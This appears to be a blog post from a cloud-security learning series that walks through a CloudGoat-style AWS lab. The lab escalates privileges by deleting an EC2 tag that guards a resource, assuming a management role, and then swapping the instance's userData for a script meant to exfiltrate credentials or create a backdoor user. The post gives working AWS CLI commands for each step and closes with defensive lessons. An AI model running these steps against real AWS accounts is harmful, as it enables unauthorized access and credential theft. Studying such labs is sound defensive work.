---
title: '100 Days of Cloud Security - Day 46: Attack — iam_privesc_by_ec2'
date: '2025-12-25'
author: 'Venkata Pathuri'
excerpt: 'Day 46 of my cloud security journey - Attack — iam_privesc_by_ec2'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 46: Attack — iam_privesc_by_ec2

## Overview

Welcome back to the cloud security learning journey! Today, we dive into an intriguing attack vector: privilege escalation through EC2 instances. This scenario builds on our previous lessons by demonstrating how seemingly innocuous permissions can be weaponized to gain unauthorized access to sensitive resources. By understanding these tactics, you can better defend your environments and prevent similar attacks in your cloud infrastructure.

## Learning Objectives

By the end of this session, you will master the techniques involved in compromising an EC2 instance using IAM privileges. You'll learn how to identify and exploit weak IAM roles, manipulate instance metadata, and execute commands that can lead to credential exfiltration. This knowledge is crucial for both offensive security assessments and defensive security strategies.

## Deep Dive

### Understanding the Attack Vector

When dealing with AWS IAM (Identity and Access Management), it's vital to recognize that permissions can often be overly permissive. In our scenario, the IAM user has the ability to delete tags on EC2 instances. This seemingly benign permission can be exploited to bypass security controls that protect critical resources, such as an EC2 instance tagged with a specific name.

### Initial Reconnaissance

The first step in any attack is reconnaissance. Using the AWS CLI, we gather information about our current identity and permissions. For example, running the command:

```bash
aws sts get-caller-identity --profile cg
```

This command reveals your user ID, account number, and ARN (Amazon Resource Name). Understanding your own permissions is crucial for planning your next steps.

### Key Findings

We find that our IAM user can delete tags:

```json
"Action": [
    "ec2:DeleteTags"
]
```

This permission hints at the potential to manipulate instance attributes that could otherwise prevent access.

### Enumeration of Roles

Next, we enumerate IAM roles in the account. Notably, the management role has permissions to modify instances, but only under certain conditions. The critical clue here is the tag protection mechanism:

```json
"Condition": {
    "StringNotEquals": {
        "aws:ResourceTag/Name": "cg_admin_ec2_cgide3v86dqqma"
    }
}
```

Since we have permission to delete tags, we can remove this protective tag and gain the ability to modify the instance.

### Compromising the Target Instance

After successfully identifying our target EC2 instance, we proceed to delete the protective tag using the command:

```bash
aws ec2 delete-tags \
  --region us-east-1 \
  --profile cg \
  --resources i-02e2202541aaab7f2 \
  --tags Key=Name
```

With the tag removed, we can now assume the management role using:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::997581282912:role/cg_ec2_management_role_cgide3v86dqqma \
  --role-session-name exploit_session \
  --profile cg
```

This grants us temporary credentials with elevated permissions.

### Final Steps: Executing Malicious UserData

With elevated privileges, we can modify the EC2 instance's user data to include a malicious script that exfiltrates credentials or creates a backdoor user. The user data script can be injected as follows:

```bash
aws ec2 modify-instance-attribute \
  --region us-east-1 \
  --profile cg-ec2-mgmt \
  --instance-id i-02e2202541aaab7f2 \
  --attribute userData \
  --value file://user-data-base64.txt
```

This command sets the malicious user data that executes upon the instance's next boot.

## Hands-On Practice

1. **Initial Reconnaissance:**
   - Run the following command to check your identity:
     ```bash
     aws sts get-caller-identity --profile cg
     ```

2. **Check Permissions:**
   - List your policies:
     ```bash
     aws iam list-user-policies --user-name cg_dev_user_cgide3v86dqqma --profile cg
     ```

3. **Delete the Protective Tag:**
   - Execute:
     ```bash
     aws ec2 delete-tags --region us-east-1 --profile cg --resources i-02e2202541aaab7f2 --tags Key=Name
     ```

4. **Assume the Role:**
   - Use:
     ```bash
     aws sts assume-role --role-arn arn:aws:iam::997581282912:role/cg_ec2_management_role_cgide3v86dqqma --role-session-name exploit_session --profile cg
     ```

5. **Modify UserData:**
   - Inject the user data script:
     ```bash
     aws ec2 modify-instance-attribute --region us-east-1 --profile cg-ec2-mgmt --instance-id i-02e2202541aaab7f2 --attribute userData --value file://user-data-base64.txt
     ```

**Common Pitfalls:**
- Ensure your AWS CLI is configured correctly with the right permissions.
- Always check the output of your commands for errors or unexpected results.

## Key Takeaways

Today, we explored the privilege escalation vector through EC2 instances and IAM roles. We learned how to leverage weak permissions to gain elevated access to critical resources, demonstrating the importance of proper IAM policy management. This exercise underscores the necessity of regularly auditing roles and permissions in your AWS environment.

## Real-World Applications

In production environments, understanding these tactics is vital for both attackers and defenders. Organizations should adopt the principle of least privilege, regularly review IAM policies, and implement monitoring solutions to detect unusual activity. By doing so, you can significantly mitigate the risks associated with privilege escalation and ensure a more secure cloud environment.

---
**Journey Progress:** 46/100 Days Complete 🚀